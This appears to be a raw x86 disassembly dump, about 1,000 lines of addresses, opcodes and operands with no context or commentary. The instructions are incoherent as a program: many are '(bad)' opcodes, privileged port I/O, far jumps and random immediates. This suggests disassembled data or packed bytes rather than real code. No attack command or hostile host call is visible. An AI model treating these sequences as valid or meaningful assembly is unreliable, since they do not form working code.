  40fbbb:	sub    BYTE PTR ds:0x67cfe01b,dh
  40fbc1:	call   0x5872ca4
  40fbc6:	push   ebx
  40fbc7:	inc    esi
  40fbc8:	adc    ebp,DWORD PTR ds:0x9ea068a6
  40fbce:	push   ebx
  40fbcf:	sub    BYTE PTR [ebp+0x6d],al
  40fbd2:	pop    ecx
  40fbd3:	daa    
  40fbd4:	inc    esi
  40fbd5:	out    dx,al
  40fbd6:	cmp    eax,0x85541bdd
  40fbdb:	mov    al,ds:0xbf0cdc8f
  40fbe0:	add    DWORD PTR ds:0x1bea7d0d,ebp
  40fbe6:	pop    esp
  40fbe7:	push   ecx
  40fbe8:	jp     0x40fb9d
  40fbea:	ret    
  40fbeb:	ja     0x40fbc5
  40fbed:	daa    
  40fbee:	aas    
  40fbef:	jno    0x40fbbf
  40fbf1:	xlat   BYTE PTR ds:[ebx]
  40fbf2:	in     al,dx
  40fbf3:	jb     0x40fc3a
  40fbf5:	stc    
  40fbf6:	mov    dh,0xb9
  40fbf8:	cmp    cl,BYTE PTR [eax]
  40fbfa:	ret    0x69e9
  40fbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbff:	iret   
  40fc00:	sbb    BYTE PTR [eax-0x54],ch
  40fc03:	sbb    al,0xbb
  40fc05:	push   ds
  40fc06:	jge    0x40fc42
  40fc08:	stos   DWORD PTR es:[edi],eax
  40fc09:	sbb    eax,eax
  40fc0b:	call   0xcb086cfe
  40fc10:	xchg   ebx,eax
  40fc11:	fisttp WORD PTR [edi]
  40fc13:	jmp    0xe2dd645e
  40fc18:	adc    DWORD PTR [edx-0xa2b2509],ebp
  40fc1e:	rcr    DWORD PTR [edi-0x58],cl
  40fc21:	pop    ss
  40fc22:	push   esp
  40fc23:	adc    bh,BYTE PTR [eax+0xd]
  40fc26:	faddp  st(4),st
  40fc28:	jo     0x40fbcc
  40fc2a:	inc    edi
  40fc2b:	sub    bl,0xba
  40fc2e:	mov    ch,0xdf
  40fc30:	push   ebx
  40fc31:	and    BYTE PTR [ebx+0x27],0xe4
  40fc35:	mov    esi,DWORD PTR [ecx-0x3f510db4]
  40fc3b:	mov    al,0xe6
  40fc3d:	(bad)  
  40fc3f:	mov    ss,WORD PTR ds:0x63f76293
  40fc45:	repnz cmp BYTE PTR [edx+0x7c938d13],bl
  40fc4c:	inc    ecx
  40fc4d:	or     al,0xa5
  40fc4f:	pop    ss
  40fc50:	arpl   cx,si
  40fc52:	fsubr  DWORD PTR [edx-0x12]
  40fc55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc56:	addr16 jl 0x40fc5d
  40fc59:	mov    dl,0x3e
  40fc5b:	cld    
  40fc5c:	xor    al,0xd4
  40fc5e:	iret   
  40fc5f:	mov    cl,0xe
  40fc61:	aad    0x15
  40fc63:	aaa    
  40fc64:	mov    ebx,0x234b4ca8
  40fc69:	(bad)  
  40fc6b:	imul   edi,edx,0x25577fd7
  40fc71:	cmc    
  40fc72:	push   0x5dd21f59
  40fc77:	adc    al,0xfc
  40fc79:	pop    es
  40fc7a:	shl    BYTE PTR [esi],cl
  40fc7c:	in     al,dx
  40fc7d:	push   ebx
  40fc7e:	test   BYTE PTR ds:0xaa6b432e,ah
  40fc84:	or     al,0x78
  40fc86:	jmp    0x40fcf5
  40fc88:	inc    eax
  40fc89:	adc    al,0x0
  40fc8b:	adc    eax,ecx
  40fc8d:	shl    BYTE PTR [esi],cl
  40fc8f:	and    ebx,DWORD PTR [ebx]
  40fc91:	mov    bl,0x11
  40fc93:	sub    ebp,DWORD PTR [edx+0x7a]
  40fc96:	sbb    BYTE PTR [ebx+eax*4-0x26],ah
  40fc9a:	in     al,0x19
  40fc9c:	mov    ds:0x607ad436,ax
  40fca2:	push   0xffffffb0
  40fca4:	pop    ebp
  40fca5:	(bad)  
  40fca6:	(bad)  
  40fca8:	loop   0x40fcf4
  40fcaa:	xor    BYTE PTR ds:0xc0666ea1,0x94
  40fcb1:	inc    ebx
  40fcb2:	arpl   WORD PTR [eax+0xb6dc7b7],di
  40fcb8:	popf   
  40fcb9:	mov    gs:0xaaa51e4e,eax
  40fcbf:	and    ebx,esi
  40fcc1:	mov    ch,0x58
  40fcc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcc4:	push   edx
  40fcc5:	adc    eax,0x87867821
  40fcca:	ret    
  40fccb:	mov    edi,0x670db5ba
  40fcd0:	adc    eax,0x9b78585e
  40fcd5:	repnz int3 
  40fcd7:	aas    
  40fcd8:	sbb    ah,al
  40fcda:	pop    edx
  40fcdb:	lods   al,BYTE PTR ds:[esi]
  40fcdc:	sub    DWORD PTR [ebx],edx
  40fcde:	inc    esi
  40fcdf:	mov    al,ds:0x48468159
  40fce4:	adc    eax,0x9c86d727
  40fce9:	inc    ebp
  40fcea:	jmp    0x40fd49
  40fcec:	mov    esi,0xdd62bc7e
  40fcf1:	mov    edx,0x66431552
  40fcf6:	shr    edx,1
  40fcf8:	das    
  40fcf9:	gs cli 
  40fcfb:	mov    cl,0x92
  40fcfd:	mov    DWORD PTR [esi+0x1476009d],0x844cb882
  40fd07:	push   ecx
  40fd08:	sar    BYTE PTR [ecx-0x1718e372],0x8c
  40fd0f:	mov    ebp,0xfc1e4f44
  40fd14:	xlat   BYTE PTR ds:[ebx]
  40fd15:	mov    DWORD PTR [eax+0x500ecd62],ebp
  40fd1b:	cs daa 
  40fd1d:	scas   eax,DWORD PTR es:[edi]
  40fd1e:	(bad)  
  40fd1f:	call   0x768e:0xf3d6708b
  40fd26:	add    DWORD PTR [edx-0x7d19f7cb],0x2992de69
  40fd30:	dec    esp
  40fd31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd32:	js     0x40fcfb
  40fd34:	aad    0x45
  40fd36:	neg    bl
  40fd38:	mov    ecx,0x2ccd6100
  40fd3d:	jnp    0x40fdb7
  40fd3f:	out    0x19,eax
  40fd41:	cs in  eax,0xf3
  40fd44:	sub    eax,DWORD PTR [ecx-0x5569a2f5]
  40fd4a:	jmp    0xaa4f:0xf00a0ea9
  40fd51:	nop
  40fd52:	and    eax,0x46a02b80
  40fd57:	xchg   esi,eax
  40fd58:	push   eax
  40fd59:	push   eax
  40fd5a:	jbe    0x40fdca
  40fd5c:	sar    BYTE PTR [ebp-0x4e],cl
  40fd5f:	fnstenv ds:0x42b8a4af
  40fd65:	and    DWORD PTR ds:0x8e820960,eax
  40fd6b:	mov    al,0xfb
  40fd6e:	or     ah,dh
  40fd70:	je     0x40fd5a
  40fd72:	xor    DWORD PTR [ebp+ecx*2-0x64],edi
  40fd76:	ja     0x40fd3e
  40fd78:	push   ecx
  40fd79:	mov    eax,0x8322f756
  40fd7e:	out    0x21,al
  40fd80:	stos   BYTE PTR es:[edi],al
  40fd81:	adc    BYTE PTR [edx],dl
  40fd83:	mov    al,0x94
  40fd85:	xchg   DWORD PTR [eax-0x49],edi
  40fd88:	sti    
  40fd89:	arpl   WORD PTR [edi+0x74376ab3],sp
  40fd8f:	mov    cl,0x8
  40fd91:	pop    es
  40fd92:	add    ebx,ecx
  40fd94:	lods   eax,DWORD PTR ds:[esi]
  40fd95:	xchg   ecx,eax
  40fd96:	std    
  40fd97:	push   edx
  40fd98:	in     al,0x4f
  40fd9a:	rcl    ecx,0xea
  40fd9d:	pop    ebx
  40fd9e:	lahf   
  40fd9f:	cmp    DWORD PTR [esi],eax
  40fda1:	dec    esi
  40fda2:	iret   
  40fda3:	sbb    esi,DWORD PTR [ecx-0x53a368f3]
  40fda9:	cmp    eax,0x64e5811b
  40fdae:	jnp    0x40fd57
  40fdb0:	jae    0x40fd75
  40fdb2:	retf   0x7d97
  40fdb5:	aaa    
  40fdb6:	outs   dx,BYTE PTR ds:[esi]
  40fdb7:	inc    eax
  40fdb8:	enter  0xb7eb,0xab
  40fdbc:	sub    DWORD PTR ds:0xbe491d61,eax
  40fdc2:	nop
  40fdc3:	rcr    BYTE PTR [esi+edi*8+0x25],1
  40fdc7:	dec    esp
  40fdc8:	test   BYTE PTR [ecx],0x83
  40fdcb:	cmp    DWORD PTR [edi-0x34],esp
  40fdce:	inc    ecx
  40fdcf:	mov    bl,0xe1
  40fdd1:	mov    ecx,0x3976692d
  40fdd6:	sub    BYTE PTR [ebx-0x739addf3],bh
  40fddc:	add    DWORD PTR [esi+0x3d],esi
  40fddf:	and    eax,0xc691f89a
  40fde4:	xlat   BYTE PTR ds:[ebx]
  40fde5:	js     0x40fd9c
  40fde7:	lds    edi,FWORD PTR [ebp+0x2b]
  40fdea:	out    0xd8,eax
  40fdec:	mov    ch,0xd0
  40fdee:	adc    DWORD PTR [ebx-0x30],0x1c
  40fdf2:	aaa    
  40fdf3:	xchg   edi,eax
  40fdf4:	cli    
  40fdf5:	out    dx,eax
  40fdf6:	clc    
  40fdf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdf8:	xlat   BYTE PTR es:[ebx]
  40fdfa:	mov    ds:0xd6ebbf86,eax
  40fdff:	pop    ecx
  40fe00:	mov    edi,0x77bd2ce7
  40fe05:	adc    ecx,DWORD PTR [edi+0x17]
  40fe08:	rcl    BYTE PTR [ebp+0x2f],cl
  40fe0b:	pushf  
  40fe0c:	test   BYTE PTR [eax+0x64],0x2a
  40fe10:	push   esi
  40fe12:	mov    ecx,DWORD PTR [esi+0x1]
  40fe15:	adc    bl,BYTE PTR [ebp-0x747bd4a]
  40fe1b:	cmp    ebp,eax
  40fe1d:	mov    bl,0x5e
  40fe1f:	ret    
  40fe20:	and    DWORD PTR [edx-0x25fc6e62],0x56
  40fe27:	ret    
  40fe28:	mov    eax,0x72ed8a05
  40fe2d:	mov    ah,0xcc
  40fe2f:	clc    
  40fe30:	sbb    dl,BYTE PTR [ebx-0x748a7837]
  40fe36:	ret    
  40fe37:	scas   al,BYTE PTR es:[edi]
  40fe38:	pop    ecx
  40fe39:	repnz out 0x3f,al
  40fe3c:	and    bh,BYTE PTR [ebp-0x52e8fb4d]
  40fe42:	mov    esi,0x607059c0
  40fe47:	pop    es
  40fe48:	cmc    
  40fe49:	mov    al,0xad
  40fe4b:	sub    DWORD PTR [esi],0x7e
  40fe4e:	out    0x21,al
  40fe50:	mov    edi,0x29e9cf41
  40fe55:	lods   eax,DWORD PTR ds:[esi]
  40fe56:	int3   
  40fe57:	jns    0x40fdfe
  40fe59:	sahf   
  40fe5a:	addr16 mov edx,0x45de1197
  40fe60:	adc    DWORD PTR [ebp-0x38dc4310],esp
  40fe66:	jns    0x40fe0d
  40fe68:	inc    edi
  40fe69:	and    DWORD PTR [ecx+0x12],0x78
  40fe6d:	mov    edx,0x938b0529
  40fe72:	ret    
  40fe73:	int    0xd8
  40fe75:	sbb    al,0x67
  40fe77:	push   edi
  40fe78:	and    eax,DWORD PTR [ebx+0x6cdea215]
  40fe7e:	jnp    0x40feba
  40fe80:	or     DWORD PTR [edx+eiz*8+0x11],esp
  40fe84:	test   DWORD PTR [esi-0x6c],eax
  40fe87:	mov    dh,0x83
  40fe89:	push   edi
  40fe8b:	nop
  40fe8c:	aad    0x33
  40fe8e:	jmp    0x40fe24
  40fe90:	or     cl,dl
  40fe92:	sbb    eax,0xbd3d0e15
  40fe97:	stc    
  40fe98:	mov    ebx,0x7178ae2a
  40fe9d:	xchg   edi,eax
  40fe9e:	mov    cl,0x91
  40fea0:	xchg   edx,eax
  40fea1:	jecxz  0x40ff1c
  40fea3:	mov    edx,0x403bc84
  40fea8:	pusha  
  40fea9:	adc    eax,0xd15ed2f5
  40feae:	test   DWORD PTR [ebx+0x3056c28f],0xe469edd2
  40feb8:	mov    eax,ds:0x786aa678
  40febd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40febe:	dec    edi
  40febf:	or     ebx,DWORD PTR [ebp+0x5b]
  40fec2:	rcl    BYTE PTR [edx-0x2b],0xb4
  40fec6:	push   esi
  40fec7:	(bad)  
  40fec8:	jl     0x40feed
  40feca:	retf   0x1448
  40fecd:	pop    esp
  40fece:	cld    
  40fecf:	ds ja  0x40ff24
  40fed2:	icebp  
  40fed3:	xor    BYTE PTR [edi+ecx*8],dh
  40fed6:	mov    eax,ds:0x958bcc74
  40fedb:	aas    
  40fedc:	out    dx,eax
  40fedd:	mov    dl,0x92
  40fedf:	and    eax,0xa7e5bbd3
  40fee4:	cli    
  40fee5:	push   0xa8b6c0eb
  40feea:	adc    esp,edx
  40feec:	int    0x1a
  40feee:	push   ecx
  40feef:	(bad)  [esi]
  40fef1:	and    esi,ebx
  40fef3:	cld    
  40fef4:	mov    ds:0xf8ea2d0b,al
  40fef9:	mov    cl,BYTE PTR [esi+ecx*8+0x16]
  40fefd:	and    DWORD PTR [ecx+0x794fec64],edi
  40ff03:	adc    DWORD PTR [edi+0x49f60dfe],eax
  40ff09:	rcr    DWORD PTR [eax+ebx*4-0x50],0x7b
  40ff0e:	push   0x38c3ab50
  40ff13:	or     DWORD PTR [esi],esi
  40ff15:	lea    edx,[ecx+0x56836fe]
  40ff1b:	mov    eax,ds:0x6dd220fb
  40ff20:	inc    BYTE PTR [eax+0x46876563]
  40ff26:	iret   
  40ff27:	pushf  
  40ff28:	dec    ecx
  40ff29:	cli    
  40ff2a:	stc    
  40ff2b:	mov    ds:0xd332fd9e,eax
  40ff30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff31:	(bad)  
  40ff32:	jae    0x40ff23
  40ff34:	pop    edi
  40ff35:	fldcw  WORD PTR [ecx]
  40ff37:	jecxz  0x40ff42
  40ff39:	push   esi
  40ff3a:	push   ecx
  40ff3b:	add    esi,ecx
  40ff3d:	stc    
  40ff3e:	aad    0xd8
  40ff40:	pop    ds
  40ff41:	push   es
  40ff42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff43:	sub    DWORD PTR [ebx-0x10],eax
  40ff46:	push   es
  40ff47:	xor    DWORD PTR [ecx+0x61],esp
  40ff4a:	adc    eax,0xffffff97
  40ff4d:	mov    BYTE PTR gs:[ecx+0x1222dcb4],dh
  40ff54:	sbb    ecx,edx
  40ff56:	call   0x9c7a:0x4b680d86
  40ff5d:	ins    BYTE PTR es:[edi],dx
  40ff5e:	mov    esp,0x913196d
  40ff63:	int    0xdf
  40ff65:	in     eax,0xa1
  40ff67:	out    0xf9,eax
  40ff69:	inc    eax
  40ff6a:	adc    al,0x63
  40ff6c:	sub    al,0x8
  40ff6e:	fdiv   DWORD PTR [eax]
  40ff70:	out    dx,eax
  40ff71:	cmp    eax,0x15f77a16
  40ff76:	jl     0x40ff1f
  40ff78:	and    al,0xaf
  40ff7a:	test   eax,0x9a763bc9
  40ff7f:	in     al,0x64
  40ff81:	mov    ds:0x2037a9c3,eax
  40ff86:	jae    0x40ffe2
  40ff88:	shl    edi,cl
  40ff8a:	mov    eax,ds:0xb33078ec
  40ff8f:	xor    eax,0x4283d187
  40ff94:	test   al,0x69
  40ff96:	adc    eax,esp
  40ff98:	es fwait
  40ff9a:	mov    es,WORD PTR [ebx+0x175ace5e]
  40ffa0:	xchg   ecx,eax
  40ffa1:	jg     0x40ffbb
  40ffa3:	or     ebp,DWORD PTR [ecx-0x32]
  40ffa6:	sbb    edi,esi
  40ffa8:	shl    DWORD PTR [ebp-0x7c3623c0],cl
  40ffae:	test   bh,bl
  40ffb0:	jae    0x40ff47
  40ffb2:	add    ebp,DWORD PTR ss:[eax-0x55]
  40ffb6:	xchg   DWORD PTR [ebp+edx*4+0x18],edx
  40ffba:	(bad)  
  40ffbb:	(bad)  
  40ffbc:	pop    ss
  40ffbd:	test   eax,0x29e38aca
  40ffc2:	clc    
  40ffc3:	imul   ebx,ebx,0xf
  40ffc6:	inc    eax
  40ffc7:	xchg   BYTE PTR [edi],ch
  40ffc9:	push   edi
  40ffca:	add    DWORD PTR [edi+0x24],esi
  40ffcd:	pop    esp
  40ffce:	mov    esi,ebx
  40ffd0:	jbe    0x410013
  40ffd2:	retf   0x62bd
  40ffd5:	jp     0x41000c
  40ffd7:	fcom   DWORD PTR [ecx]
  40ffd9:	aaa    
  40ffda:	or     cl,BYTE PTR [esp+ebp*1]
  40ffdd:	jne    0x40ff7a
  40ffdf:	jno    0x40ffde
  40ffe1:	mov    ebp,0xb23c5f59
  40ffe6:	add    al,0xcc
  40ffe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffe9:	cmp    eax,DWORD PTR [esi+0x3e562b97]
  40ffef:	loope  0x410021
  40fff1:	mov    dl,ah
  40fff3:	sbb    ch,BYTE PTR [edx]
  40fff5:	push   cs
  40fff6:	sub    ah,ch
  40fff8:	rcr    BYTE PTR [eax],0x67
  40fffb:	mov    ebp,edi
  40fffd:	and    ebp,DWORD PTR [eax+0x67d11221]
  410003:	call   0x542c3fea
  410008:	pop    ss
  410009:	int    0x1
  41000b:	daa    
  41000c:	call   0x74fa:0x6133c632
  410013:	sbb    BYTE PTR [edi+0x66],ah
  410016:	and    al,0x5a
  410018:	mov    DWORD PTR [edi-0x52da1d12],ebp
  41001e:	loope  0x40ffe8
  410020:	pop    edx
  410021:	adc    eax,0xb4c3f978
  410026:	xor    esp,DWORD PTR [ecx+0x46c1082c]
  41002c:	or     al,0x59
  41002e:	pop    edx
  41002f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410030:	test   DWORD PTR [ecx],ecx
  410032:	xor    BYTE PTR [esi],bh
  410034:	adc    eax,0xcb95a019
  410039:	sbb    BYTE PTR [ebp+0x961565],ch
  41003f:	sti    
  410040:	leave  
  410041:	in     al,dx
  410042:	push   cs
  410043:	inc    esi
  410044:	scas   al,BYTE PTR es:[edi]
  410045:	je     0x410066
  410047:	leave  
  410048:	test   DWORD PTR [esi],0xb8bae703
  41004e:	add    al,0x9f
  410050:	leave  
  410051:	jnp    0x410053
  410053:	sub    al,0x44
  410055:	sub    dl,cl
  410057:	mov    edi,0x1a1f5a8d
  41005c:	inc    ecx
  41005d:	adc    BYTE PTR [ebx-0x19],al
  410060:	xchg   BYTE PTR [eax],dh
  410062:	ficomp WORD PTR [eax+0x32]
  410065:	push   0x76d3c3f6
  41006a:	jo     0x40fffe
  41006c:	cmp    eax,0x98dae4ba
  410071:	es (bad) 
  410073:	fmul   QWORD PTR [eax-0x459c3c92]
  410079:	mov    bh,0xc0
  41007b:	mov    ch,0xdd
  41007d:	arpl   WORD PTR [ecx],si
  41007f:	(bad)  [ebp+0x20599de0]
  410085:	bound  ecx,QWORD PTR [edx]
  410087:	add    DWORD PTR [ecx],edx
  410089:	outs   dx,DWORD PTR ds:[esi]
  41008a:	shl    BYTE PTR [eax+0x4339f905],cl
  410090:	sub    cl,dl
  410092:	adc    eax,DWORD PTR [ebp*2-0x69f2ff87]
  410099:	gs adc eax,0x46dad0d9
  41009f:	add    esp,DWORD PTR [ebp+ebx*8+0x70]
  4100a3:	sub    ah,dh
  4100a5:	jmp    0xb3aa3b81
  4100aa:	das    
  4100ab:	mov    bl,0x14
  4100ad:	sbb    DWORD PTR [ebx],esi
  4100af:	inc    ecx
  4100b0:	icebp  
  4100b1:	sbb    DWORD PTR [eax],esp
  4100b3:	call   0x5046e29d
  4100b8:	stos   DWORD PTR es:[edi],eax
  4100b9:	and    BYTE PTR [ecx-0x51],bh
  4100bc:	push   es
  4100bd:	outs   dx,DWORD PTR ds:[esi]
  4100be:	clc    
  4100bf:	sbb    al,0x43
  4100c1:	(bad)  
  4100c2:	iret   
  4100c3:	push   0xa5525cf7
  4100c8:	mov    ecx,0x25dc6b93
  4100cd:	adc    ebx,ebx
  4100cf:	ret    0x552b
  4100d2:	jns    0x410080
  4100d4:	scas   al,BYTE PTR es:[edi]
  4100d5:	nop
  4100d6:	lock mov ah,0xae
  4100d9:	mov    cl,0xf8
  4100db:	xchg   esi,eax
  4100dc:	js     0x410130
  4100de:	call   0x69b2:0x9647efef
  4100e5:	mov    edi,0xf9042bf4
  4100ea:	ret    
  4100eb:	sub    eax,0xb21e9a3f
  4100f0:	or     BYTE PTR [ecx-0x1b],al
  4100f3:	jp     0x4100ef
  4100f5:	jge    0x4100a5
  4100f7:	and    BYTE PTR [ebp+0x23e5bf68],dl
  4100fd:	push   ss
  4100fe:	jl     0x4100ea
  410100:	or     ecx,DWORD PTR [eax]
  410102:	retf   0x409f
  410105:	je     0x410099
  410107:	sbb    eax,DWORD PTR [ecx-0x69643afb]
  41010d:	add    DWORD PTR [ebx],edi
  41010f:	sub    DWORD PTR [ecx+0x2],esp
  410112:	xor    BYTE PTR [edi],cl
  410114:	loope  0x41016f
  410116:	cwde   
  410117:	(bad)  
  410118:	out    dx,al
  410119:	repnz sub dh,dh
  41011c:	jg     0x4100cf
  41011e:	into   
  41011f:	xchg   edx,eax
  410120:	loop   0x4100ca
  410122:	and    edx,DWORD PTR [ecx-0x21d01c5e]
  410128:	and    eax,0x7d051ecb
  41012d:	or     eax,0x4232ef59
  410132:	adc    BYTE PTR [esi+0x1f82bb82],dl
  410138:	test   BYTE PTR [ebp+0x2a9c9ba],bl
  41013e:	pop    ecx
  41013f:	shr    BYTE PTR [ebx],0x77
  410142:	mov    edx,0xb0ef63e
  410147:	jle    0x4101ad
  410149:	add    dh,BYTE PTR [ebx]
  41014b:	adc    DWORD PTR [ecx+0x755a4db9],edx
  410151:	addr16 ret 0x3154
  410155:	lods   al,BYTE PTR ds:[esi]
  410156:	fild   DWORD PTR [esi+0x41]
  410159:	mov    dh,0x46
  41015b:	jg     0x4101dc
  41015d:	mov    al,ds:0x597f740d
  410162:	or     edx,esp
  410164:	xor    al,0x83
  410166:	outs   dx,DWORD PTR ds:[esi]
  410167:	push   0x136768a
  41016c:	cmp    esp,edx
  41016e:	iret   
  41016f:	push   edx
  410170:	mov    bl,0xe6
  410172:	in     eax,0x52
  410174:	dec    esi
  410175:	sbb    al,BYTE PTR [ecx+0x51a8070f]
  41017b:	add    DWORD PTR [ebx-0x23],edi
  41017e:	lods   eax,DWORD PTR ds:[esi]
  41017f:	xor    esp,ecx
  410181:	add    al,0x6b
  410183:	gs pop esi
  410185:	adc    al,0xc2
  410187:	pop    edi
  410188:	jns    0x41016e
  41018a:	inc    ebx
  41018b:	and    BYTE PTR [ecx+edx*4],dh
  41018e:	xchg   ebx,eax
  41018f:	dec    esp
  410190:	add    al,0xe9
  410192:	jmp    0x52f6:0xaeb43579
  410199:	inc    edi
  41019a:	push   eax
  41019b:	les    esi,FWORD PTR [edx]
  41019d:	rcl    dh,cl
  41019f:	stc    
  4101a0:	dec    esp
  4101a1:	sbb    al,BYTE PTR [esi+0x3]
  4101a4:	aam    0xaa
  4101a6:	je     0x410212
  4101a8:	push   es
  4101a9:	add    al,0xc5
  4101ab:	push   edx
  4101ac:	pop    ebx
  4101ad:	nop
  4101ae:	xor    al,BYTE PTR [edx]
  4101b0:	mov    esp,0xa8913d39
  4101b5:	xchg   edx,eax
  4101b6:	sub    DWORD PTR [ebp+0x5c629532],0x6555fd28
  4101c0:	loop   0x410234
  4101c2:	aaa    
  4101c3:	xor    eax,0x4f5f4349
  4101c8:	xchg   esi,eax
  4101c9:	mov    al,BYTE PTR ds:0xec298327
  4101cf:	jmp    0x2bfd:0x4c9eec06
  4101d6:	adc    bl,BYTE PTR [edx-0x1d]
  4101d9:	xlat   BYTE PTR ds:[ebx]
  4101da:	add    eax,0xdab6d70b
  4101df:	cwde   
  4101e0:	pop    esp
  4101e1:	gs mov bl,0x74
  4101e4:	mov    al,0x3b
  4101e6:	cmc    
  4101e7:	addr16 sbb eax,0x53567ca9
  4101ed:	cmp    DWORD PTR ss:[eax-0x79],ebp
  4101f1:	mov    ch,0x7
  4101f3:	pop    esi
  4101f4:	push   ss
  4101f5:	xbegin 0x3733e1ad
  4101fb:	mov    al,ds:0x8f943821
  410200:	test   al,0x70
  410202:	and    ch,BYTE PTR [esi+0x24]
  410205:	call   0x55e49cea
  41020a:	test   DWORD PTR [eax+0x3c],0xb9237398
  410211:	outs   dx,DWORD PTR ds:[esi]
  410212:	jbe    0x4101ba
  410214:	ins    DWORD PTR es:[edi],dx
  410215:	mov    eax,ds:0x68b66a95
  41021a:	dec    edi
  41021b:	sub    al,0x32
  41021d:	js     0x41023c
  41021f:	inc    esi
  410220:	rcr    edi,0x2
  410223:	loopne 0x4101eb
  410225:	ins    DWORD PTR es:[edi],dx
  410226:	shr    BYTE PTR [ecx+0x7847af85],cl
  41022c:	mov    al,ds:0x6efb1cdd
  410231:	jmp    FWORD PTR [esi+0x66]
  410234:	shl    BYTE PTR [ebp-0x75],cl
  410237:	mov    ch,0xbf
  410239:	mov    edx,0x5206f0f4
  41023e:	call   0x86a3b831
  410243:	pop    ebp
  410244:	push   ecx
  410245:	addr16 jp 0x4102bf
  410248:	push   ebx
  410249:	mov    esp,0x8bdc8bd5
  41024e:	dec    esi
  41024f:	fmul   DWORD PTR [ebp+edi*1+0x4fdc40fc]
  410256:	test   cl,bl
  410258:	loopne 0x41024d
  41025a:	lahf   
  41025b:	cmp    esp,esi
  41025d:	fwait
  41025e:	push   ds
  41025f:	pop    es
  410260:	outs   dx,DWORD PTR ds:[esi]
  410261:	mov    ah,0xbd
  410263:	push   0xffffff95
  410265:	clc    
  410266:	or     al,0x6a
  410268:	push   ebx
  410269:	mul    DWORD PTR [ecx]
  41026b:	cmc    
  41026c:	or     dh,BYTE PTR [esi+edx*4+0xe95a0d7]
  410273:	mov    fs,WORD PTR [edi+esi*1-0x7f]
  410277:	pop    ebx
  410278:	dec    esi
  410279:	dec    esi
  41027a:	mov    eax,0x23da7cff
  41027f:	sub    ah,BYTE PTR [esi+0x458eb3d9]
  410285:	add    al,0x3e
  410287:	je     0x410262
  410289:	cmc    
  41028a:	stos   BYTE PTR es:[edi],al
  41028b:	xor    ah,ch
  41028d:	leave  
  41028e:	dec    edx
  41028f:	sbb    edx,DWORD PTR [ebx+0x3c46b04b]
  410295:	mov    bl,0x90
  410297:	jb     0x410249
  410299:	xchg   esp,eax
  41029a:	repz std 
  41029c:	add    esi,DWORD PTR [eax+eax*2+0x2a82ed50]
  4102a3:	test   cl,cl
  4102a5:	out    0xb,eax
  4102a7:	xchg   BYTE PTR [ebx],bh
  4102a9:	add    al,0x97
  4102ab:	mov    ah,0x41
  4102ad:	sti    
  4102ae:	popa   
  4102af:	mov    edx,0x2063641c
  4102b4:	push   ss
  4102b5:	outs   dx,DWORD PTR ds:[esi]
  4102b6:	ins    DWORD PTR es:[di],dx
  4102b8:	mov    al,0x2c
  4102ba:	dec    edi
  4102bb:	dec    esi
  4102bc:	std    
  4102bd:	cdq    
  4102be:	mov    al,ds:0xc14983c0
  4102c3:	aaa    
  4102c4:	inc    edi
  4102c5:	or     dh,ch
  4102c7:	add    DWORD PTR [ebp+0x12],esp
  4102ca:	retf   0x1695
  4102cd:	into   
  4102ce:	arpl   WORD PTR [edi-0x1f],bp
  4102d1:	inc    ebp
  4102d2:	icebp  
  4102d3:	scas   al,BYTE PTR es:[edi]
  4102d4:	call   0xdcbb1ab3
  4102d9:	stos   DWORD PTR es:[edi],eax
  4102da:	imul   esp,DWORD PTR [ebp+0x6d],0xffffffa7
  4102de:	dec    edx
  4102df:	lods   eax,DWORD PTR ds:[esi]
  4102e0:	sub    eax,0x416f7f1a
  4102e5:	leave  
  4102e6:	outs   dx,DWORD PTR ds:[esi]
  4102e7:	mov    al,0x5
  4102e9:	sbb    edx,DWORD PTR [eax]
  4102eb:	jne    0x4102b6
  4102ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102ee:	cmp    bh,ch
  4102f0:	outs   dx,BYTE PTR ds:[esi]
  4102f1:	jmp    0xbe84:0x13eb52e4
  4102f8:	ja     0x41027b
  4102fa:	dec    ebp
  4102fb:	or     al,0x7e
  4102fd:	ins    DWORD PTR es:[edi],dx
  4102fe:	(bad)  
  4102ff:	fisttp DWORD PTR [ebx]
  410301:	or     eax,0x95de403
  410306:	xchg   DWORD PTR [ebx],ebp
  410308:	(bad)  
  410309:	push   edx
  41030a:	cmp    BYTE PTR [ecx+edi*8+0x1e],ch
  41030e:	mov    dl,BYTE PTR [ecx+eiz*4-0x78]
  410312:	rcl    bl,1
  410314:	in     eax,0xb
  410316:	mov    cl,0x67
  410318:	int    0x7c
  41031a:	xchg   DWORD PTR [esi+0x5f905845],ebp
  410320:	pop    ecx
  410321:	inc    esp
  410322:	jne    0x4102a8
  410324:	mov    ebx,0x70537ac9
  410329:	fucom  st(5)
  41032b:	push   esi
  41032c:	sti    
  41032d:	test   BYTE PTR [edx-0x74],bl
  410330:	cmp    bh,BYTE PTR [eax]
  410332:	xor    BYTE PTR [eiz*4+0x5ce9d42e],cl
  410339:	test   eax,0x599e019a
  41033e:	ja     0x410331
  410340:	int    0xbf
  410342:	and    al,0x6e
  410344:	int    0xcc
  410346:	sub    al,0x38
  410348:	xchg   edi,eax
  410349:	pop    esp
  41034a:	pop    eax
  41034b:	cmp    al,0x38
  41034d:	jmp    0x411f3ec5
  410352:	ins    DWORD PTR es:[edi],dx
  410353:	push   esi
  410354:	cmp    DWORD PTR [esi],edx
  410356:	cld    
  410357:	or     BYTE PTR [ecx],dh
  410359:	and    DWORD PTR [ecx-0x76],eax
  41035c:	dec    ebx
  41035d:	std    
  41035e:	dec    eax
  41035f:	mov    DWORD PTR [edx],edi
  410361:	or     al,0x11
  410363:	adc    ebx,edx
  410365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410366:	sbb    al,0x3c
  410368:	jp     0x4103c4
  41036a:	jmp    0x4103d8
  41036c:	ja     0x41034a
  41036e:	add    bh,BYTE PTR [eax+0x4eecf4df]
